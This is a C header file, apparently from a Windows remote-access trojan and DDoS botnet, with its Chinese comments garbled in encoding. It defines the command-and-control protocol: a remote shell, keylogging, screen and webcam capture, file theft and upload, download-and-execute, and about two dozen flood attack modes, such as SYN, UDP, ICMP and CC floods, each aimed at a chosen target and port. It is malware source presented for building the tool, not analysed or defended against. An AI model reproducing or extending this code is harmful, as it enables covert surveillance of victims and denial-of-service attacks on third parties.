#ifndef _SEURAT_COMMAND_H__
#define _SEURAT_COMMAND_H__

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000

#include <winsock2.h>
#include "mstcpip.h"

// SOCKET buffer max length
#define BUFFER_MAXLEN		    1024*2
#define XCHANGE_BUFLEN          2 * 1024 * 1024 //2M

//socket type
#define SOCKET_CONNECT    0x11000000 //���ӿ��Ƶ�socket
#define SOCKET_FILEMANAGE 0x11000001 //�ļ������socket
#define SOCKET_SCREEN     0x11000002 //��Ļ��ص�socket
#define SOCKET_CMDSHELL   0x11000003 //Զ��shell��socket
#define SOCKET_KEYLOG     0x11000004 //���̼�¼��socket
#define SOCKET_PROCESS    0x11000005 //���̹����socket
#define SOCKET_FILEDOWN   0x11000006 //�ļ����ص�socket
#define SOCKET_FILEUP     0x11000007 //�ļ��ϴ���socket
#define SOCKET_VIDEOCAP   0x11000008 //��Ƶ��׽��socket
#define SOCKET_DLLLOADER  0x11000009 //Loader��socket

//��������
#define CMD_SUCCEED       0x00000000 //����ִ�гɹ�
#define CMD_FAILED        0x00000001 //����ִ��ʧ��
#define CMD_INVALID       0x00000002 //��Ч����
#define CMD_HEARTBEAT     0x00000003 //������
#define CMD_DLLDATA       0x00000004 //Dll for Loader

#define CMD_UNINSTALL     0x20000000 //ж��
#define CMD_POWEROFF      0x20000001 //�ػ�
#define CMD_REBOOT        0x20000002 //����
#define CMD_LOGOFF        0x20000003 //ע��
#define CMD_DOWNEXEC      0x20000004 //����ִ��
#define CMD_OPENURL       0x20000005 //����ҳ
#define CMD_CTRLALTDEL    0x20000006 // Ctrl + Alt + del
#define CMD_KEYDOWN       0x20000011 //WM_KEYDOWN 
#define CMD_KEYUP         0x20000012 //WM_KEYUP
#define CMD_MOUSEMOVE     0x20000013 //WM_MOUSEMOVE
#define CMD_LBUTTONDOWN   0x20000014 //WM_LBUTTONDOWN
#define CMD_LBUTTONUP     0x20000015 //WM_LBUTTONUP
#define CMD_LBUTTONDBLCLK 0x20000016 //WM_LBUTTONDBLCLK
#define CMD_RBUTTONDOWN   0x20000017 //WM_RBUTTONDOWN   
#define CMD_RBUTTONUP     0x20000018 //WM_RBUTTONUP
#define CMD_RBUTTONDBLCLK 0x20000019 //WM_RBUTTONDBLCLK
#define CMD_RESTART       0x20000020 //Restart

//�ļ�����
#define CMD_FILEMANAGE    0x21000000 //��ʼ�ļ��������
#define CMD_FILEMAGSTOP   0x21000001 //�����ļ��������
#define CMD_FILEDRIVER    0x21000002 //��ȡ������
#define CMD_FILEDIRECTORY 0x21000003 //��ȡ�ļ���
#define CMD_FILEDELETE    0x21000004 //ɾ��
#define CMD_FILEEXEC      0x21000005 //ִ��
#define CMD_FILEPASTE     0x21000006 //ճ��
#define CMD_FILERENAME    0x21000007 //������
#define CMD_FILEDOWNSTART 0x21000008 //���ؿ�ʼ
#define CMD_FILEDOWNING   0x21000009 //������
#define CMD_FILEUPSTART   0x2100000A //�ϴ���ʼ
#define CMD_FILEUPING     0x2100000B //�ϴ���
#define CMD_READFILEEOR   0x2100000C //���ļ�����
#define CMD_WRITEFILEEOR  0x2100000D //д�ļ�����
#define CMD_DIRFLODERERR  0x2100000E //�ļ��в��ɶ�

//��Ļ���
#define CMD_SCREENSTART   0x22000001 //��ʼ��Ļ���
#define CMD_SCREENBITS    0x22000002 //����ͼ����ɫ��
//Զ��shell�����Ϣ
#define CMD_SHELLSTART    0x23000000 //��ʼCmdShell�߳�
#define CMD_SHELLSTOP     0x23000001 //����CmdShell�߳�
#define CMD_SHELLRUN      0x23000002 //ִ��shell����
#define CMD_SHELLERR      0x23000003 //ִ��shell�������

//���̼�¼�����Ϣ
#define CMD_KEYLOGSTART   0x24000001 //��ʼ���̼�¼
#define CMD_KEYLOGSTOP    0x24000002 //��ͣ���̼�¼
#define CMD_KEYLOGCLOSE   0x24000003 //�رռ��̼�¼
//���������Ϣ
#define CMD_PROCESSSTART  0x25000000 //�������̹���
#define CMD_PROCESSSTOP   0x25000001 //�������̹���
#define CMD_PROCESSLIST   0x25000002 //�����б�
#define CMD_PROCESSKILL   0x25000003 //��������
#define CMD_PROCLISTERR   0x25000004 //�оٽ��̴���
#define CMD_PROCKILLERR   0x25000005 //�رս��̴���
//��Ƶ��׽
#define CMD_VIDEOSTART    0x28000000 //��Ƶ��׽
//�ܾ�����
#define CMD_DDOSATTACK    0x30000000 //�ܾ�����ʼ
#define CMD_DDOSSTOP      0x30000001 //�ܾ�����ֹͣ
#define CMD_DDOSSYNFLOOD  0x31000001 //Syn Flood
#define CMD_DDOSICMPFLOOD 0x31000002 //Icmp Flood
#define CMD_DDOSUDPFLOOD  0x31000003 //Udp Flood
#define CMD_DDOSUDPSMALL  0x31000004 //Udp Small
#define CMD_DDOSTCPFLOOD  0x31000005 //Tcp Flood
#define CMD_DDOSTCPMULT   0x31000006 //Tcp Mult Connect
#define CMD_DDOSNOCACHE   0x32000001 //Get Method No Cache
#define CMD_DDOSCCATTACK  0x32000002 //CC Attack
#define CMD_DDOSGETNULL   0x32000003 //Get Method Get Null
#define CMD_DDOSCHUANQI   0x33000001 //ChuanQi game attack
#define CMD_DDOSNETGATE   0x33000002 //Net Gate
#define CMD_DDOSSMART     0x33000003 //Smart attck
#define CMD_DDOSSYNUDP    0x34000001 //Syn+Udp Flood
#define CMD_DDOSTCMPTCP   0x34000002 //Icmp+Tcp Flood
#define CMD_DDOSUDPTCP    0x34000003 //Udp+Tcp Flood
#define CMD_DDOSFINWAIT1  0x35000001 //Fin_Wait1 attack
#define CMD_DDOSFINWAIT2  0x35000002 //Fin_Wait2 attack
#define CMD_DDOSESTABLISH 0x35000003 //Stablished
#define CMD_DDOSSPIDERCC  0x36000001 //Spider CC Attack
#define CMD_DDOSCUSTOM    0x37000001 //custom data attack
///////////////////////////////////////////////////////////////////////
//�ṹ���壬8�ֽڶ���
//����ϵͳ��Ϣ�ṹ��
typedef struct tagSysInfo
{
	char cComputer[64];  //������
	char cMemorySize[32];//�ڴ��С
	char cOS[64];        //����ϵͳ
	char cVersion[32];   //����˰汾
	BOOL bVideo;         //�Ƿ�������ͷ
	int  iVipID;         //VIP�û�ID
}SysInfo,*LPSysInfo;

//������Ϣ�ṹ��
typedef struct tagProcessInfo
{
	DWORD dwPid;        //����ID
	DWORD dwThreads;    //�߳�����
	DWORD dwPriClass;   //�������ȼ�
	char  FileName[32]; //����ӳ������
	char  FilePath[128];//����·��
}ProcessInfo,*LPProcessInfo;

//Ӳ�̽ṹ��
typedef struct tagDriver
{
	char driver[4];     //�̷�����
	char display[64];   //����
	int  drivertype;    //������
}DriverInfo, *LPDriverInfo;

//�ļ���Ϣ�ṹ��
typedef struct tagFileInfo
{
	int  iType;         //1-Ŀ¼��2-�ļ���3-��ЧĿ¼
	char cFileName[64]; //�ļ���
	char cAttrib[32];   //�ļ�����
	char cTime[32];     //ʱ��
	char cSize[32];     //�ļ���С	
}FileInfo,*LPFileInfo;

//�ļ�������Ϣ�ṹ��
typedef struct tagFileOpt
{
	int  iSize;         //�ϴ������ļ���ʾ�ļ���С��-1��ʾ��������,1��ʾ��������
	char cScrFile[100];
	char cDstFile[100];
}FileOpt;

//������Ϣ�ṹ��
typedef struct tagDdosAttack
{
	char szTarget[200];//����Ŀ��
	int  iPort;        //�����˿�
	int  iThread;      //�߳�
	int  iExtend1;     //��������
	int  iExtend2;     //��������
}DdosAttack,*LPDdosAttack;

//��Ϣͷ�ṹ��
typedef struct tagMsgHead
{                                   //������Ļʱ����������;��
	DWORD dwCmd;       //��Ϣ����   /�ڼ�֡
	DWORD dwSize;      //���ݳ���   /���ݳ���
	DWORD dwExtend1;   //��������   /ѹ��ǰ����
	DWORD dwExtend2;   //��������   /ѹ���󳤶�
}MsgHead,*LPMsgHead;

//����TCP�������
BOOL TurnonKeepAlive(SOCKET s, UINT nKeepAliveSec);

//��������
BOOL SendData(SOCKET s, char *data, int len);
//��������
BOOL RecvData(SOCKET s, char *data, int len);
//������Ϣ
BOOL SendMsg(SOCKET s, char const *pBuf, LPMsgHead lpMsgHead);
//������Ϣ
BOOL RecvMsg(SOCKET s,char *pBuf, LPMsgHead lpMsgHead);

#endif //_SEURAT_COMMAND_H__
